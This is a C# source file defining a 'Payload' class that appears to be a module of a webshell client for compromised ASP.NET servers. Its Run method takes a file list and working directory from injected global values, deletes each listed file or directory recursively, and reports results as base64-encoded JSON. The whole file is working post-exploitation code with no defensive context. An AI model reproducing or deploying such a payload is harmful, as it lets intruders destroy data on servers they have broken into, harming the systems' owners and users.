using System.Collections;
using System;
using System.Web;
using System.IO;
using System.Text;
using System.Runtime.Serialization;

public class Payload{

    [DataContract]
    class Ret {

        [DataMember]
        public int code = 1;

        [DataMember]
        public ArrayList msg = new ArrayList();
    }
    Ret ret;
    public string Run(){
        ret = new Ret();
        Directory.SetCurrentDirectory(Global.pwd);
        String[] flist = Global.flist.Split(new char[]{'\n'});
        foreach(string fname in flist){
            if(File.Exists(fname)){
                try{
                    File.Delete(fname);
                    ret.msg.Add(Convert.ToBase64String(Encoding.UTF8.GetBytes(String.Format("File `{0}` delete Successfully!", fname))));
                }catch(Exception e){
                    ret.code = -1;
                    ret.msg.Add(Convert.ToBase64String(Encoding.UTF8.GetBytes(String.Format("File `{0}` delete failed!{1}", fname, e))));
                }
            }else if(Directory.Exists(fname)){
                try{
                    Directory.Delete(fname, true);
                    ret.msg.Add(Convert.ToBase64String(Encoding.UTF8.GetBytes(String.Format("Directory `{0}` delete Successfully!", fname))));
                }catch(Exception e){
                    ret.code = -1;
                    ret.msg.Add(Convert.ToBase64String(Encoding.UTF8.GetBytes(String.Format("Directory `{0}` delete failed!{1}", fname, e))));
                }
            }else if(fname == "") continue;
            else{
                ret.code = -1;
                ret.msg.Add(Convert.ToBase64String(Encoding.UTF8.GetBytes(String.Format("File `{0}` is not exist!", fname))));
            }
        }
        return Global.json_encode(ret);
    }
}